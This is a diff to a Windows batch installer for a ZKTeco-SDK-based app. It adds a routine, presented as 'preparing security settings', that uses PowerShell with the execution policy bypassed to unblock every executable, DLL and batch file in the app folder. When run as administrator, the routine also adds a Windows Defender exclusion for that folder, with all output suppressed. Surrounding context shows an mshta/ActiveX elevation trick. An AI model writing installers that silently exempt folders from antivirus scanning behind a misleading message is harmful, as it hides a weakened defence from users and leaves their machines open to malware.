@@ -55,6 +55,8 @@ echo ERROR: ZKTeco SDK install may have failed or was cancelled. & echo Please r
 
 :SDK_OK
 echo ZKTeco SDK detected.
+echo Preparing app files and security settings...
+call :PREPARE_SECURITY
 
 call :CHECK_DOTNET
 if errorlevel 1 goto :DOTNET_MISSING
@@ -197,6 +199,15 @@ exit /b 1
 if exist "%PS_EXE%" "%PS_EXE%" -NoProfile -ExecutionPolicy Bypass -Command "$p=Start-Process -Verb RunAs -WorkingDirectory '%~dp1' -FilePath '%~1' -Wait -PassThru; exit $p.ExitCode" >nul 2>&1 & exit /b
 mshta "javascript:var sh=new ActiveXObject('Shell.Application'); sh.ShellExecute('%~1','','','runas',1); close();" >nul 2>&1 & exit /b 0
 exit /b 1
+
+:PREPARE_SECURITY
+if not exist "%PS_EXE%" exit /b 0
+"%PS_EXE%" -NoProfile -ExecutionPolicy Bypass -Command ^
+  "$app='%APP_DIR%';" ^
+  "try { Get-ChildItem -Path $app -Recurse -File -Include *.exe,*.dll,*.bat | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue } } catch {};" ^
+  "try { if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Add-MpPreference -ExclusionPath $app -ErrorAction SilentlyContinue | Out-Null } } catch {};" ^
+  "exit 0" >nul 2>&1
+exit /b 0
 
 :CHECK_DOTNET
 set "NETCORE_OK="
